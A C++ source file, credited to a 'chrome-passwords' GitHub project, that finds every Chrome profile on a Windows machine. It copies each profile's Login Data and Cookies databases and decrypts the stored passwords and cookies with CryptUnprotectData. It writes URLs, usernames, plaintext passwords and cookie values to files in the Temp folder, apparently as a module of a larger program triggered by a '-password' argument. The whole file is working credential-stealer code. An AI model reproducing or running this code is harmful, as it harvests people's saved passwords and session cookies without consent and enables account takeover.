/*
	Author: Adnan Alhomssi
	URL: https://github.com/adnanonline/chrome-passwords
	License: GNU GPL V3
*/
#include "..\..\stdafx.h"

#include "..\..\base64\base64.h"

using namespace std;

string strTempPath("");
stringstream debug(string(""));

/*
** Pass sqlite3 handler, iterate over queried rows and decrypt each password by copying bytes from password_value
** column to DATA_BLOB data structure which is convient for Win32API CryptUnprotectData function
*/
stringstream getPass(
	sqlite3 *db
) {
	stringstream dump(string("")); // String stream for our output
	const char *zSql = "SELECT origin_url, username_value, password_value, date_created, times_used, date_last_used FROM logins";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		debug << "statement failed rc = " << rc << endl;
		return dump;
	}
	debug << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	debug << "RC: " << rc << endl;
	while (rc == SQLITE_ROW) {
		string decrypted("<failed>");

		DATA_BLOB encryptedPass, decryptedPass;

		try {
			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
			encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

			SetLastError(0);
			BOOL result = CryptUnprotectData(
				&encryptedPass, // In Data
				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
				NULL,           // Optional entropy
				NULL,           // Reserved
				NULL,           // Here, the optional
								// prompt structure is not
								// used.
				0,
				&decryptedPass);

			std::string strFailed("<failed>");
			if (!result)
			{
				std::stringstream temp;
				temp << "<failed 0x" << std::hex << result << ">";
				decrypted = temp.str();
			}

			decrypted = string((char *)decryptedPass.pbData, decryptedPass.cbData);
		}
		catch (...)
		{

		}

		dump << "Url     :" << sqlite3_column_text(pStmt, 0) << endl;
		dump << "Username:" << (char *)sqlite3_column_text(pStmt, 1) << endl;
  	    dump << "Password:" << decrypted << endl;
		dump << "Created:" << (char *)sqlite3_column_text(pStmt, 3) << endl;
		dump << "Used:" << (char *)sqlite3_column_text(pStmt, 4) << endl;
		dump << "LastUsed:" << (char *)sqlite3_column_text(pStmt, 5) << endl;
		dump << endl;
		dump << endl;
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}
stringstream getCookies(
	sqlite3 *db
) {
	stringstream dump(string("")); // String stream for our output
	const char *zSql = "SELECT HOST_KEY,path,encrypted_value,expires_utc from cookies";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		debug << "statement failed rc = " << rc << endl;
		return dump;
	}
	debug << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/

	rc = sqlite3_step(pStmt);
	debug << "RC: " << rc << endl;
	while (rc == SQLITE_ROW) {
		string base64("<failed>");
		string decrypted("<failed>");

		DATA_BLOB encryptedPass, decryptedPass;
		try {
			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
			encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

			CryptUnprotectData(
				&encryptedPass, // In Data
				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
				NULL,           // Optional entropy
				NULL,           // Reserved
				NULL,           // Here, the optional
								// prompt structure is not
								// used.
				0,
				&decryptedPass);

			base64 = base64_encode((unsigned char const*)decryptedPass.pbData, decryptedPass.cbData);
			decrypted = string((char *)decryptedPass.pbData, decryptedPass.cbData);
		}
		catch (...)
		{
		}

		unsigned long long int expires = sqlite3_column_int64(pStmt, 3);

		dump << endl;
		dump << "Host   :" << sqlite3_column_text(pStmt, 0) << endl;
		dump << "Path   :" << (char *)sqlite3_column_text(pStmt, 1) << endl;
		dump << "Expires:" << expires << endl;
		dump << "Cookie :" << base64 << endl;
		dump << "Cookie :" << decrypted << endl;
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}
sqlite3* getDBHandler(const char* dbFilePath) {
	sqlite3 *db;
	int rc = sqlite3_open((strTempPath + dbFilePath).c_str(), &db);
	if (rc)
	{
		debug << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << endl << endl;
		sqlite3_close(db);
		return nullptr;
	}
	else
	{
		debug << dbFilePath << " DB Opened." << endl << endl;
		return db;
	}
}

std::vector<std::string> getProfilePath(std::string path, std::string search)
{
	std::vector<std::string> retVal;

	const CHAR* cCookiesJournal = "Cookies-journal";

	WIN32_FIND_DATAA FindFileData;
	ZeroMemory(&FindFileData, sizeof(FindFileData));
	HANDLE hFind = FindFirstFileA((path + search).c_str(), &FindFileData);

	if (INVALID_HANDLE_VALUE != hFind)
	{
		do {
			if (
				(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
				&& FindFileData.cFileName[0] != '.'
				&& FindFileData.cFileName[1] != '.'
			)
			{
				std::vector<std::string> profilePaths = getProfilePath(path + FindFileData.cFileName + "\\", cCookiesJournal);
				retVal.insert(retVal.end(), profilePaths.begin(), profilePaths.end());
			}
			else
			{
				if (0 == strcmpi(FindFileData.cFileName, cCookiesJournal))
				{
					retVal.push_back(path);
				}
			}

			ZeroMemory(&FindFileData, sizeof(FindFileData));
		} while (FindNextFileA(hFind, &FindFileData));

		FindClose(hFind);
		hFind = NULL;
	}

	//	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
	return retVal;
}

//relative to chrome directory
bool copyDB(const char *source, const char *dest) {
	//Form path for Chrome's Login Data 

	std:string path = source;

	string destPath = strTempPath + dest;

	//copy the sqlite3 db from chrome directory 
	//as we are not allowed to open it directly from there (chrome could also be running)
	ifstream  src(path, std::ios::binary);
	ofstream  dst(destPath, std::ios::binary);
	dst << src.rdbuf();
	dst.close();
	src.close();
	return true; //ToDo: error handling
}
int deleleteDB(const char *fileName) {
	try {
		string filePath = strTempPath + fileName;

		if (remove(filePath.c_str()) != 0)
			debug << "Could not delete " << filePath << endl;
		else
			debug << filePath << " deleted... Bye bye" << endl;

		return 0;
	}
	catch (...)
	{
	}


	return 0;
}

void PasswordRun(LPSTR lpCmdLine)
{
	debug.clear();

	My::Debug("PasswordRun:==>");

	strTempPath = string(getenv("LOCALAPPDATA")) + "\\Temp\\";

	std::istringstream ss(lpCmdLine);

	if (std::string::npos == std::string(lpCmdLine).find("-password"))
	{
		My::Debug("PasswordRun: Skipping password run");
		return;
	}

	std::istream_iterator<std::string> begin(ss), end;

	//putting all the tokens in the vector
	std::vector<std::string> arrayTokens(begin, end);

	std::vector<const char*> argv;
	for (std::vector<std::string>::iterator itr = arrayTokens.begin(); itr != arrayTokens.end(); itr++)
	{
		argv.push_back((*itr).c_str());
	}
	int argc = argv.size();

	std::vector<std::string> paths = getProfilePath(std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\", "*");
	if (paths.empty())
		paths.push_back(getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data\\Default\\"));

	for (size_t index = 0; index < paths.size(); index++/*std::vector<std::string>::iterator itr = paths.begin(); itr != paths.end(); itr++*/)
	{
		My::Debug("PasswordRun: " + paths[index]);

		string profile("Profile" + std::to_string(index));
		std::string path = paths[index];

		int rc;
		try
		{
			// stringstream class check1 
			stringstream pathStream(path);

			string segment;
			while (std::getline(pathStream, segment, '\\'))
			{
				if (!segment.empty())
					profile = segment;
			}

			std::string db = path + "Login Data";
			std::string tempDB = "p8791-" + profile + ".db";

			// Open Database
			My::Debug(std::string("PasswordRun: ") + "Copying from " + path + " to " + tempDB);
			copyDB(db.c_str(), tempDB.c_str());

			sqlite3 *passwordsDB = getDBHandler(tempDB.c_str());

			stringstream passwords = getPass(passwordsDB);
			//	debug << passwords.str();

			string fileName = strTempPath + "p8791-" + profile + ".bin";
			std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
			myfile << passwords.str();
			myfile.close();

			if (sqlite3_close(passwordsDB) == SQLITE_OK)
				debug << "DB connection closed properly" << endl;
			else
				debug << "Failed to close DB connection" << endl;

			deleleteDB(tempDB.c_str());
		}
		catch(...)
		{
			My::Debug(std::string("PasswordRun: Exception"));
		}

		bool flagCookies = false;
		try {
			ifstream f((strTempPath + "cookies.bin").c_str());
			flagCookies = f.good();
		}
		catch (...)
		{

		}

		for (int i = 0; i < argc; i++) {
			if (strlen(argv[i]) < 2)continue;
			switch (argv[i][1]) {
			case 'c':
				flagCookies = true;
				break;
			}
		}
		if (flagCookies) {
			try
			{
				std::string db = path + "Cookies";
				std::string tempDB = "c8791-" + profile + ".db";

				// Open Database
				My::Debug(std::string("PasswordRun: ") + "Copying from " + path + " to " + tempDB);
				copyDB(db.c_str(), tempDB.c_str());
				sqlite3 *cookiesDb = getDBHandler(tempDB.c_str());
				stringstream cookies = getCookies(cookiesDb);

				string fileName = strTempPath + "c8791-" + profile + ".bin";
				std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
				myfile << cookies.str();
				myfile.close();

				if (sqlite3_close(cookiesDb) == SQLITE_OK)
					debug << "DB connection closed properly" << endl;
				else
					debug << "Failed to close DB connection" << endl;

				deleleteDB(tempDB.c_str());
			}
			catch(...)
			{
				My::Debug(std::string("PasswordRun: Exception"));
			}
		}
	}

	My::Debug(debug.str());
	My::Debug("PasswordRun:<--");
}